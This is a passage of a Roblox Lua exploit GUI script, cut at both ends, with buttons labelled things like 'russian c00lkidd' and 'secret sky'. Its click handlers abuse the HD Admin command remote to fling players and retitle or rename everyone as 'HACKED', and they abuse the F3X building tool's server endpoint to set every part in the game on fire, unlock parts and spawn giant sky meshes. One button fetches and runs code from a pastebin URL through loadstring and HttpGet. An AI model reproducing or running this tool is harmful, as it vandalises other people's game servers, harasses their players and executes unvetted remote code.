		e_32.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_32.TextScaled = true
		e_32.TextSize = 14.000
		e_32.TextWrapped = true
	
		e_33.Name = "e"
		e_33.Parent = r
		e_33.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_33.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_33.Position = UDim2.new(0, 189, 0, 580)
		e_33.Size = UDim2.new(0, 97, 0, 28)
		e_33.Font = Enum.Font.Roboto
		e_33.Text = "russian 2"
		e_33.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_33.TextScaled = true
		e_33.TextSize = 14.000
		e_33.TextWrapped = true
	
		e_34.Name = "e"
		e_34.Parent = r
		e_34.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_34.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_34.Position = UDim2.new(0.153081506, 0, 18.4400005, 0)
		e_34.Size = UDim2.new(0, 97, 0, 28)
		e_34.Font = Enum.Font.Roboto
		e_34.Text = "russian "
		e_34.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_34.TextScaled = true
		e_34.TextSize = 14.000
		e_34.TextWrapped = true
	
		e_35.Name = "e"
		e_35.Parent = r
		e_35.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e_35.BorderColor3 = Color3.fromRGB(255, 0, 0)
		e_35.Position = UDim2.new(0, 193, 0, 838)
		e_35.Size = UDim2.new(0, 97, 0, 28)
		e_35.Font = Enum.Font.Roboto
		e_35.Text = "russian c00lkidd"
		e_35.TextColor3 = Color3.fromRGB(255, 255, 255)
		e_35.TextScaled = true
		e_35.TextSize = 14.000
		e_35.TextWrapped = true
	
		b_38.Name = "b"
		b_38.Parent = r
		b_38.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_38.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_38.Position = UDim2.new(0.381709754, 0, 10.8000002, 0)
		b_38.Size = UDim2.new(0, 98, 0, 27)
		b_38.Font = Enum.Font.Roboto
		b_38.Text = "THEME"
		b_38.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_38.TextScaled = true
		b_38.TextSize = 14.000
		b_38.TextWrapped = true
	
		b_39.Name = "b"
		b_39.Parent = ye
		b_39.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_39.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_39.Position = UDim2.new(-0.297820836, 0, 0.0166666675, 0)
		b_39.Rotation = -12.000
		b_39.Size = UDim2.new(0, 98, 0, 29)
		b_39.Font = Enum.Font.Roboto
		b_39.Text = "secret sky"
		b_39.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_39.TextScaled = true
		b_39.TextSize = 14.000
		b_39.TextWrapped = true
	
		-- Scripts:
	
		local function LYFGWFF_fake_script() -- ye.d 
			local script = Instance.new('LocalScript', ye)
	
			local UserInputService = game:GetService("UserInputService")
			local runService = (game:GetService("RunService"));
	
			local gui = script.Parent
	
			local dragging
			local dragInput
			local dragStart
			local startPos
	
			function Lerp(a, b, m)
				return a + (b - a) * m
			end;
	
			local lastMousePos
			local lastGoalPos
			local DRAG_SPEED = (8); -- // The speed of the UI darg.
			function Update(dt)
				if not (startPos) then return end;
				if not (dragging) and (lastGoalPos) then
					gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
					return 
				end;
	
				local delta = (lastMousePos - UserInputService:GetMouseLocation())
				local xGoal = (startPos.X.Offset - delta.X);
				local yGoal = (startPos.Y.Offset - delta.Y);
				lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
				gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
			end;
	
			gui.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position
					lastMousePos = UserInputService:GetMouseLocation()
	
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
	
			gui.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
	
			runService.Heartbeat:Connect(Update)
		end
		coroutine.wrap(LYFGWFF_fake_script)()
		local function RYOPYUB_fake_script() -- jeje.LocalScript 
			local script = Instance.new('LocalScript', jeje)
	
			while wait() do
				for i = 0,255,5 do
					script.Parent.ImageColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
					wait(0.01)
				end
				for i = 255,0,-5 do
					script.Parent.ImageColor3 = Color3.fromRGB(i,255,0)
					wait(0.01)
				end
				for i = 0,255,5 do
					script.Parent.ImageColor3 = Color3.fromRGB(0,255,i)
					wait(0.01)
				end
				for i = 255,0,-5 do
					script.Parent.ImageColor3 = Color3.fromRGB(0,i,255)
					wait(0.01)
				end
				for i = 0,255,5 do
					script.Parent.ImageColor3 = Color3.fromRGB(i,0,255)
					wait(0.01)
				end
				for i = 255,0,-5 do
					script.Parent.ImageColor3 = Color3.fromRGB(255,0,i)
					wait(0.01)
				end
			end
		end
		coroutine.wrap(RYOPYUB_fake_script)()
		local function YHESLIA_fake_script() -- b.LocalScript 
			local script = Instance.new('LocalScript', b)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";titler all HACKED")
			end)
		end
		coroutine.wrap(YHESLIA_fake_script)()
		local function TEVLYO_fake_script() -- b_2.LocalScript 
			local script = Instance.new('LocalScript', b_2)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";name all redkidd95")
			end)
		end
		coroutine.wrap(TEVLYO_fake_script)()
		local function URBIN_fake_script() -- b_3.LocalScript 
			local script = Instance.new('LocalScript', b_3)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 70599226186148 ;pitch 0.2 ;volume 10")
			end)
		end
		coroutine.wrap(URBIN_fake_script)()
		local function CXXPG_fake_script() -- b_4.Script 
			local script = Instance.new('Script', b_4)
	
			script.Parent.MouseButton1Click:Connect(function() 
				loadstring(game:HttpGet("https://pastebin.com/raw/SFTcZ7Nu"))()	
			end)
		end
		coroutine.wrap(CXXPG_fake_script)()
		local function XZXGBUC_fake_script() -- b_5.LocalScript 
			local script = Instance.new('LocalScript', b_5)
	
			script.Parent.MouseButton1Click:Connect(function()
				local player = game.Players.LocalPlayer
				local char = player.Character or player.CharacterAdded:Wait()
				local tool
	
				for i, v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				for i, v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				local remote = tool.SyncAPI.ServerEndpoint
				local RunService = game:GetService("RunService")
	
				function _(args)
					remote:InvokeServer(unpack(args))
				end
	
				function CreatePart(cf, parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
	
				function SetAnchor(part, boolean)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
	
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part, meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://" .. meshid
							}
						}
					}
					_(args)
				end
	
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = texid
							}
						}
					}
					_(args)
				end
	
				function MeshResize(part, size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
	
				function SetTransparency(part, value)
					local args = {
						[1] = "SyncTransparency",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = value
							}
						}
					}
					_(args)
				end
	
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = part
						},
						[3] = stringg
					}
	
					_(args)
				end
	
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
	
				local images = {
					"rbxassetid://13059062216",
					"rbxassetid://13059079081",
					"rbxassetid://13059086913",
					"rbxassetid://13059100365",
					"rbxassetid://13059122107",
					"rbxassetid://13059139679",
					"rbxassetid://13059164385",
					"rbxassetid://13059187920",
					"rbxassetid://13059199929",
					"rbxassetid://13059207998",
					"rbxassetid://13059235017",
					"rbxassetid://13059235017"
				}
	
				local skyPart
				local skyLoop
				local frameTime = 2 / 20
				local lastUpdate = 0
	
				function CreateSky()
					local hrp = char:FindFirstChild("HumanoidRootPart")
					if not hrp then return end
	
					local cf = hrp.CFrame
					CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
	
					for _, v in workspace:GetDescendants() do
						if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
							skyPart = v
							SetAnchor(skyPart, true)
							AddMesh(skyPart)
							SetMesh(skyPart, "111891702759441")
							MeshResize(skyPart, Vector3.new(4000, 4000, 4000))
							SetTransparency(skyPart, 1)
							SetName(v,"Sky")
	
							local index = 1
							skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
								lastUpdate = lastUpdate + deltaTime
								if lastUpdate >= frameTime then
									lastUpdate = 0
									if not skyPart then
										print("fuck ittt")
										return
									end
									SetTransparency(skyPart, 0)
									SetTexture(skyPart, images[index])
									index = index % #images + 1
								end
							end)
						end
					end
				end
	
				function ResetSky()
					if skyPart then
						DestroyPart(skyPart)
						skyPart = nil
					end
					if skyLoop then
						skyLoop:Disconnect()
						skyLoop = nil
					end
					CreateSky()
				end
	
				player.CharacterAdded:Connect(function(newChar)
					char = newChar
					ResetSky()
				end)
	
				if char and char:FindFirstChild("Humanoid") then
					char:WaitForChild("Humanoid").Died:Connect(function()
						ResetSky()
					end)
				end
	
				CreateSky()
			end)
		end
		coroutine.wrap(XZXGBUC_fake_script)()
		local function KBLPLXG_fake_script() -- b_6.LocalScript 
			local script = Instance.new('LocalScript', b_6)
	
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local hdFolder = ReplicatedStorage:WaitForChild("HDAdminHDClient")
			local signals = hdFolder:WaitForChild("Signals")
			local requestCommand = signals:WaitForChild("RequestCommandSilent")
	
	
			script.Parent.MouseButton1Click:Connect(function()
	
				local command = ";Transparency" 
				requestCommand:InvokeServer(command)
			end)
		end
		coroutine.wrap(KBLPLXG_fake_script)()
		local function DNNEX_fake_script() -- b_7.LocalScript 
			local script = Instance.new('LocalScript', b_7)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";pants me 16288876823 ;shirt me 559966322 ;face me 406001052")
			end)
		end
		coroutine.wrap(DNNEX_fake_script)()
		local function NWLZHWO_fake_script() -- b_8.LocalScript 
			local script = Instance.new('LocalScript', b_8)
	
			local button = script.Parent
			local player = game.Players.LocalPlayer
			local RunService = game:GetService("RunService")
	
			button.MouseButton1Click:Connect(function()
				local char = player.Character
				if not char then return end
	
				local tool
				for _, v in ipairs(player:GetDescendants()) do
					if v.Name == "SyncAPI" then tool = v.Parent break end
				end
				if not tool then
					for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
						if v.Name == "SyncAPI" then tool = v.Parent break end
					end
				end
	
				if not tool then return end
				local remote = tool.SyncAPI.ServerEndpoint
	
				local function getRandomColor()
					return Color3.new(math.random(), math.random(), math.random())
				end
	
				local parts = {}
				for _, v in ipairs(char:GetChildren()) do
					if v:IsA("BasePart") then
						table.insert(parts, v)
					end
				end
	
				RunService.Heartbeat:Connect(function()
					local syncData = {}
					for _, part in ipairs(parts) do
						table.insert(syncData, {
							Part = part,
							Color = getRandomColor(),
							UnionColoring = false
						})
					end
	
					remote:InvokeServer("SyncColor", syncData)
					task.wait(1)
				end)
			end)
		end
		coroutine.wrap(NWLZHWO_fake_script)()
		local function HYCL_fake_script() -- b_9.LocalScript 
			local script = Instance.new('LocalScript', b_9)
	
			script.Parent.MouseButton1Click:Connect(function()
				--Head Spin
				--found in an old f3x gui 
	
				local player = game.Players.LocalPlayer
				local char = player.Character or player.CharacterAdded:Wait()
				local tool
	
				for _, v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
						break
					end
				end
				for _, v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
						break
					end
				end
	
				if not tool then
					warn("you need f3x gng")
					return
				end
	
				local remote = tool.SyncAPI.ServerEndpoint
	
				local head = char:WaitForChild("Head", 5)
				if not head then return end
	
				local headMesh = head:FindFirstChildWhichIsA("SpecialMesh") or head:FindFirstChildWhichIsA("FileMesh")
				if not headMesh then
					warn("Cabeça sem SpecialMesh/FileMesh")
					return
				end
	
				local hats = {}
				for _, acc in char:GetChildren() do
					if acc:IsA("Accessory") and acc:FindFirstChild("Handle") then
						local h = acc.Handle
						local m = h:FindFirstChildWhichIsA("SpecialMesh") or h:FindFirstChildWhichIsA("FileMesh")
						if m then
							table.insert(hats, {Part = h, MeshId = m.MeshId})
						end
					end
				end
	
				local RunService = game:GetService("RunService")
				local t = 0
	
				RunService.RenderStepped:Connect(function(dt)
					t = t + dt * 4   
	
	
					local radius = 0.35         
					local spinX = math.cos(t) * radius
					local spinZ = math.sin(t) * radius
	
					local swayY = math.sin(t * 2.5) * 0.15  
					local swayX_extra = math.sin(t * 1.2) * 0.1
					local swayZ_extra = math.cos(t * 1.5) * 0.1
	
					local offset = Vector3.new(spinX + swayX_extra, swayY, spinZ + swayZ_extra)
	
					local partsToSync = {
						{
							Part = head,
							MeshId = headMesh.MeshId,
							Offset = offset
						}
					}
	
					for _, hat in hats do
						table.insert(partsToSync, {
							Part = hat.Part,
							MeshId = hat.MeshId,
							Offset = offset
						})
					end
	
					remote:InvokeServer("SyncMesh", partsToSync)
				end)
	
	
			end)
		end
		coroutine.wrap(HYCL_fake_script)()
		local function AJKSCW_fake_script() -- b_10.LocalScript 
			local script = Instance.new('LocalScript', b_10)
	
			script.Parent.MouseButton1Click:Connect(function()
				local player = game.Players.LocalPlayer
				local char = player.Character
				local tool
				for i,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for i,v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				remote = tool.SyncAPI.ServerEndpoint
				function _(args)
					remote:InvokeServer(unpack(args))
				end
				function SetCollision(part,boolean)
					local args = {
						[1] = "SyncCollision",
						[2] = {
							[1] = {
								["Part"] = part,
								["CanCollide"] = boolean
							}
						}
					}
					_(args)
				end
				function SetAnchor(boolean,part)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
				function CreatePart(cf,parent,types)
					local args = {
						[1] = "CreatePart",
						[2] = types,
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
				function MovePart(part,cf)
					local args = {
						[1] = "SyncMove",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf
							}
						}
					}
					_(args)
				end
				function Resize(part,size,cf)
					local args = {
						[1] = "SyncResize",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf,
								["Size"] = size
							}
						}
					}
					_(args)
				end
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part,meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://"..meshid
							}
						}
					}
					_(args)
				end
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = "rbxassetid://"..texid
							}
						}
					}
					_(args)
				end
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = workspace.Part
						},
						[3] = stringg
					}
	
					_(args)
				end
				function MeshResize(part,size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
				function Weld(part1, part2,lead)
					local args = {
						[1] = "CreateWelds",
						[2] = {
							[1] = part1,
							[2] = part2
						},
						[3] = lead
					}
					_(args)
	
				end
				function SetLocked(part,boolean)
					local args = {
						[1] = "SetLocked",
						[2] = {
							[1] = part
						},
						[3] = boolean
					}
					_(args)
				end
				function SetTrans(part,int)
					local args = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = int
							}
						}
					}
					_(args)
				end
				function CreateSpotlight(part)
					local args = {
						[1] = "CreateLights",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight"
							}
						}
					}
					_(args)
				end
				function SyncLighting(part,brightness)
					local args = {
						[1] = "SyncLighting",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight",
								["Brightness"] = brightness
							}
						}
					}
					_(args)
				end
	
				function Material(part,mate)
					local args = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Material"] = mate
							}
						}
					}
					_(args)
				end
				function Color(part,color)
					local args = {
						[1] = "SyncColor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Color"] = color --[[Color3]],
								["UnionColoring"] = false
							}
						}
					}
					_(args)
				end
				function toptexturecreate(part)
					local args = {
						[1] = "CreateTextures",
						[2] = {
							[1] = {
								["Part"] = part,
								["Face"] = Enum.NormalId.Top,
								["TextureType"] = "Texture"
							}
						}
					}
	
					_(args)
				end
				function toptextureadd(part)
					local args = {
						[1] = "SyncTexture",
						[2] = {
							[1] = {
								["Part"] = part,
								["Face"] = Enum.NormalId.Top,
								["TextureType"] = "Texture",
								["Texture"] = "rbxassetid://139842730945412",
								["StudsPerTileV"] = 25,
								["StudsPerTileU"] = 25
							}
						}
					}
					_(args)
				end
				hrpx = math.floor(char.HumanoidRootPart.CFrame.x)
				hrpz = math.floor(char.HumanoidRootPart.CFrame.z)
				hrpy = math.floor(char.HumanoidRootPart.CFrame.y)
				function SpawnBasePlate()
					CreatePart(CFrame.new(hrpx,hrpy-20,hrpz),workspace,"Spawn")
					for i,v in game.Workspace:GetChildren() do
						if v:IsA("BasePart") and v.CFrame.y == hrpy - 20 and v.CFrame.x == hrpx then
							spawn(function()
								Resize(v,Vector3.new(600,20,600),CFrame.new(hrpx,hrpy-20,hrpz))
								Color(v,Color3.fromRGB(0, 0, 0))
								toptexturecreate(v)
								toptextureadd(v)
								while wait(1) do
									pcall(function()SetLocked(v,true)end)
								end
							end)
						end
					end
				end
				SpawnBasePlate()
			end)
		end
		coroutine.wrap(AJKSCW_fake_script)()
		local function ITFYP_fake_script() -- b_11.LocalScript 
			local script = Instance.new('LocalScript', b_11)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
	
				local player = game.Players.LocalPlayer
				local char = player.Character
				local tool
				for i,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for i,v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				--craaa
				remote = tool.SyncAPI.ServerEndpoint
				function _(args)
					remote:InvokeServer(unpack(args))
				end
				function SetCollision(part,boolean)
					local args = {
						[1] = "SyncCollision",
						[2] = {
							[1] = {
								["Part"] = part,
								["CanCollide"] = boolean
							}
						}
					}
					_(args)
				end
				function SetAnchor(boolean,part)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
				function CreatePart(cf,parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
				function MovePart(part,cf)
					local args = {
						[1] = "SyncMove",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf
							}
						}
					}
					_(args)
				end
				function Resize(part,size,cf)
					local args = {
						[1] = "SyncResize",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf,
								["Size"] = size
							}
						}
					}
					_(args)
				end
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part,meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://"..meshid
							}
						}
					}
					_(args)
				end
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = "rbxassetid://"..texid
							}
						}
					}
					_(args)
				end
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = workspace.Part
						},
						[3] = stringg
					}
	
					_(args)
				end
				function MeshResize(part,size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
				function Weld(part1, part2,lead)
					local args = {
						[1] = "CreateWelds",
						[2] = {
							[1] = part1,
							[2] = part2
						},
						[3] = lead
					}
					_(args)
	
				end
				function SetLocked(part,boolean)
					local args = {
						[1] = "SetLocked",
						[2] = {
							[1] = part
						},
						[3] = boolean
					}
					_(args)
				end
				function SetTrans(part,int)
					local args = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = int
							}
						}
					}
					_(args)
				end
				function CreateSpotlight(part)
					local args = {
						[1] = "CreateLights",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight"
							}
						}
					}
					_(args)
				end
				function SyncLighting(part,brightness)
					local args = {
						[1] = "SyncLighting",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight",
								["Brightness"] = brightness
							}
						}
					}
					_(args)
				end
				function AddFire(part)
					local args = {
						[1] = "CreateDecorations",
						[2] = {
							[1] = {
								["Part"] = part,
								["DecorationType"] = "Fire"
							}
						}
					}
					_(args)
				end
				function FireParts()
					for i,v in game.Workspace:GetDescendants() do
						spawn(function()
							SetLocked(v,false)
							AddFire(v)
						end)
					end
				end
				FireParts()
	
				local player = game.Players.LocalPlayer
	
			end)
	
			--97518021379547
		end
		coroutine.wrap(ITFYP_fake_script)()
		local function TMLHTBO_fake_script() -- b_12.LocalScript 
			local script = Instance.new('LocalScript', b_12)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 114417850687501 ;pitch 0.31 ;volume 10")
			end)
		end
		coroutine.wrap(TMLHTBO_fake_script)()
		local function FWVIJZ_fake_script() -- jeje_2.LocalScript 
			local script = Instance.new('LocalScript', jeje_2)
	
			while wait() do
				for i = 0,255,5 do
					script.Parent.ImageColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
					wait(0.01)
				end
				for i = 255,0,-5 do
					script.Parent.ImageColor3 = Color3.fromRGB(i,255,0)
					wait(0.01)
				end
				for i = 0,255,5 do
					script.Parent.ImageColor3 = Color3.fromRGB(0,255,i)
					wait(0.01)
				end
				for i = 255,0,-5 do
					script.Parent.ImageColor3 = Color3.fromRGB(0,i,255)
					wait(0.01)
				end
				for i = 0,255,5 do
					script.Parent.ImageColor3 = Color3.fromRGB(i,0,255)
					wait(0.01)
				end
				for i = 255,0,-5 do
					script.Parent.ImageColor3 = Color3.fromRGB(255,0,i)
					wait(0.01)
				end
			end
		end
		coroutine.wrap(FWVIJZ_fake_script)()
		local function VLNUU_fake_script() -- b_13.LocalScript 
			local script = Instance.new('LocalScript', b_13)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";size me 10 ;speed me 30")
			end)
		end
		coroutine.wrap(VLNUU_fake_script)()
		local function HOVU_fake_script() -- b_14.LocalScript 
			local script = Instance.new('LocalScript', b_14)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";fling all")
			end)
		end
		coroutine.wrap(HOVU_fake_script)()
		local function DVST_fake_script() -- b_15.LocalScript 
			local script = Instance.new('LocalScript', b_15)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local Players = game:GetService("Players")
	
				local RequestCommand = ReplicatedStorage
					:WaitForChild("HDAdminHDClient")
					.Signals.RequestCommandSilent
	
	
				RequestCommand:InvokeServer(";unfog")
				RequestCommand:InvokeServer(";fogcolor black")
				RequestCommand:InvokeServer(";time 0")
	
				wait(0.3)
	
				local player = Players.LocalPlayer
				local char = player.Character or player.CharacterAdded:Wait()
	
	
				local tool
				for _,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for _,v in ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				if not tool then
					warn("No se encontró SyncAPI")
					return
				end
	
				local remote = tool.SyncAPI.ServerEndpoint
				local function _(args)
					remote:InvokeServer(unpack(args))
				end
	
				-- FUNCIONES F3X
				function CreatePart(cf,parent)
					_({
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					})
				end
	
				function AddMesh(part)
					_({
						[1] = "CreateMeshes",
						[2] = {
							[1] = {["Part"] = part}
						}
					})
				end
	
				function SetMesh(part,id)
					_({
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://"..id
							}
						}
					})
				end
	
				function SetTexture(part,id)
					_({
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = "rbxassetid://"..id
							}
						}
					})
				end
	
				function MeshResize(part,size)
					_({
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					})
				end
	
				function SetCollision(part,bool)
					_({
						[1] = "SyncCollision",
						[2] = {
							[1] = {
								["Part"] = part,
								["CanCollide"] = bool
							}
						}
					})
				end
	
				function SetLocked(part,bool)
					_({
						[1] = "SetLocked",
						[2] = {[1] = part},
						[3] = bool
					})
				end
	
				function SetName(part,name)
					_({
						[1] = "SetName",
						[2] = {[1] = part},
						[3] = name
					})
				end
	
				function SetVertexColor(part,vec)
					_({
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["VertexColor"] = vec
							}
						}
					})
				end
	
				function CreateSpotlight(part)
					_({
						[1] = "CreateLights",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight"
							}
						}
					})
				end
	
				function SyncLighting(part,brightness)
					_({
						[1] = "SyncLighting",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight",
								["Brightness"] = brightness
							}
						}
					})
				end
	
	
				function Sky(textureId)
					local hrp = char:WaitForChild("HumanoidRootPart")
	
					local x = math.floor(hrp.Position.X)
					local y = math.floor(hrp.Position.Y)
					local z = math.floor(hrp.Position.Z)
	
					CreatePart(
						CFrame.new(x,y,z) + Vector3.new(0,-10,0),
						workspace
					)
	
					for _,v in workspace:GetDescendants() do
						if v:IsA("BasePart")
							and math.floor(v.Position.X) == x
							and math.floor(v.Position.Z) == z then
	
							SetName(v,"sky")
							AddMesh(v)
							SetMesh(v,"111891702759441")
							SetTexture(v, textureId)
	
							MeshResize(v, Vector3.new(99999,99999,99999))
							SetCollision(v,false)
							SetLocked(v,true)
	
	
							SetVertexColor(v, Vector3.new(5,5,5))
	
	
							CreateSpotlight(v)
							SyncLighting(v,12)
						end
					end
				end
	
	
